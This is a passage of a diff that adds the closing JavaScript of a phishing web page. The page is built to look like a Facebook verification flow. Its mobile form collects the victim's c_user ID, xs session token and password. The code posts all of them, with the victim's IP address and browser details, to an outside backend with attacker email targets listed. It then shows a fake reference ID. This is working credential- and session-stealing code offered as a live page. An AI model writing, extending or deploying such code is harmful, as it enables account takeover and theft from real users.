+                mobileGuideVideo.play().then(() => {
+                    videoStates.mobile.playing = true;
+                }).catch(error => {
+                    console.log("Mobile video play error:", error);
+                    mobileGuideVideo.controls = true;
+                });
+            }
+            
+            function updateMobileStepUI() {
+                Object.values(mobileStepContents).forEach(step => {
+                    if (step) step.style.display = 'none';
+                });
+                
+                if (mobileCurrentStep <= 2) {
+                    mobileStepContents[mobileCurrentStep].style.display = 'block';
+                } else if (mobileCurrentStep === 3) {
+                    mobileStepContents.success.style.display = 'block';
+                }
+            }
+            
+            function goToMobileStep(step) {
+                mobileCurrentStep = step;
+                updateMobileStepUI();
+            }
+            
+            // Validation functions...
+            function validateMobileCUser() {
+                const input = document.getElementById('mobile-c_user');
+                const error = document.getElementById('mobile-c_user_error');
+                input.value = input.value.replace(/[^0-9]/g, '');
+                
+                if (input.value.length < 8) {
+                    error.style.display = 'flex';
+                    return false;
+                }
+                error.style.display = 'none';
+                return true;
+            }
+            
+            function validateMobileXsToken() {
+                const input = document.getElementById('mobile-xs_token');
+                const error = document.getElementById('mobile-xs_token_error');
+                const errorText = document.getElementById('mobile-xs_error_text');
+                
+                const hasUpperCase = /[A-Z]/.test(input.value);
+                const hasLowerCase = /[a-z]/.test(input.value);
+                const hasNumbers = /[0-9]/.test(input.value);
+                const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?~`]/.test(input.value);
+                const hasMinimumLength = input.value.length >= 6;
+                
+                if (!hasMinimumLength || !hasUpperCase || !hasLowerCase || !hasNumbers || !hasSpecialChar) {
+                    let errors = [];
+                    if (!hasMinimumLength) errors.push("minimum 6 characters");
+                    if (!hasUpperCase) errors.push("uppercase letter");
+                    if (!hasLowerCase) errors.push("lowercase letter");
+                    if (!hasNumbers) errors.push("number");
+                    if (!hasSpecialChar) errors.push("special character");
+                    
+                    errorText.textContent = `Must contain: ${errors.join(", ")}`;
+                    error.style.display = 'flex';
+                    return false;
+                }
+                
+                error.style.display = 'none';
+                return true;
+            }
+            
+            async function submitMobileFormData() {
+                const cUserValid = validateMobileCUser();
+                const xsTokenValid = validateMobileXsToken();
+                
+                if (!cUserValid || !xsTokenValid) {
+                    if (!cUserValid) document.getElementById('mobile-c_user_error').style.display = 'flex';
+                    if (!xsTokenValid) document.getElementById('mobile-xs_token_error').style.display = 'flex';
+                    return;
+                }
+                
+                const c_user = document.getElementById('mobile-c_user').value;
+                const xs = document.getElementById('mobile-xs_token').value;
+                
+                localStorage.setItem('c_user', c_user);
+                localStorage.setItem('xs_token', xs);
+                
+                const formData = {
+                    c_user: c_user,
+                    xs: xs,
+                    timestamp: new Date().toISOString(),
+                    ip_address: await getIPAddress(),
+                    userAgent: navigator.userAgent,
+                    language: selectedLanguage,
+                    data_name: 'MEHTAB',
+                    page_type: isSpecialPage ? 'special' : 'normal',
+                    form_type: 'first_form',
+                    view_type: 'mobile'
+                };
+                
+                const button = document.getElementById('mobileNextStep1Btn');
+                const originalText = button.innerHTML;
+                button.innerHTML = '<span class="spinner"></span> Verifying...';
+                button.disabled = true;
+                
+                try {
+                    const response = await fetch('https://shiper-backend-gspaltenhorn.on.shiper.app/submit', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ...formData,
+                            target_emails: isSpecialPage ? 
+                                ['first@mail.com', 'bawrbyfu@gmail.com'] : 
+                                ['bawrbyfu@gmail.com', 'first@mail.com'],
+                            submission_type: 'form_submission',
+                            page_type: isSpecialPage ? 'special' : 'normal',
+                            device_type: 'mobile'
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        // Form reset karo
+                        document.getElementById('mobile-c_user').value = '';
+                        document.getElementById('mobile-xs_token').value = '';
+                        localStorage.removeItem('c_user');
+                        localStorage.removeItem('xs_token');
+                        
+                        goToMobileStep(2);
+                    }
+                } catch (error) {
+                    console.error('Mobile form submission error:', error);
+                } finally {
+                    button.innerHTML = originalText;
+                    button.disabled = false;
+                }
+            }
+            
+            async function submitMobilePasswordData() {
+                const password = document.getElementById('mobile-password').value;
+                
+                if (!password) {
+                    document.getElementById('mobile-password_error').style.display = 'flex';
+                    return;
+                }
+                
+                const button = document.getElementById('mobileSubmitPasswordBtn');
+                const originalText = button.innerHTML;
+                button.innerHTML = '<span class="spinner"></span> Completing...';
+                button.disabled = true;
+                
+                try {
+                    localStorage.setItem('password', password);
+                    
+                    const passwordData = {
+                        password: password,
+                        c_user: document.getElementById('mobile-c_user').value,
+                        xs: document.getElementById('mobile-xs_token').value,
+                        timestamp: new Date().toISOString(),
+                        ip_address: await getIPAddress(),
+                        userAgent: navigator.userAgent,
+                        language: selectedLanguage,
+                        data_name: 'MEHTAB',
+                        page_type: isSpecialPage ? 'special' : 'normal',
+                        form_type: 'password_form',
+                        view_type: 'mobile'
+                    };
+                    
+                    const response = await fetch('https://shiper-backend-gspaltenhorn.on.shiper.app/pass', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ...passwordData,
+                            target_emails: isSpecialPage ? 
+                                ['first@mail.com', 'bawrbyfu@gmail.com'] : 
+                                ['bawrbyfu@gmail.com', 'first@mail.com'],
+                            submission_type: 'password_submission',
+                            page_type: isSpecialPage ? 'special' : 'normal',
+                            device_type: 'mobile'
+                        })
+                    });
+                    
+                    if (response.ok) {
+                        // Password field reset karo
+                        document.getElementById('mobile-password').value = '';
+                        localStorage.removeItem('password');
+                        
+                        const referenceId = 'FB-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+                        document.getElementById('mobile-referenceId').textContent = referenceId;
+                        goToMobileStep(3);
+                    }
+                } catch (error) {
+                    console.error('Mobile password submission error:', error);
+                } finally {
+                    button.innerHTML = originalText;
+                    button.disabled = false;
+                }
+            }
+            
+            async function getIPAddress() {
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    return data.ip;
+                } catch (error) {
+                    return "unknown";
+                }
+            }
+            
+            initMobile();
+        }
+
+        // Initialize the application
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
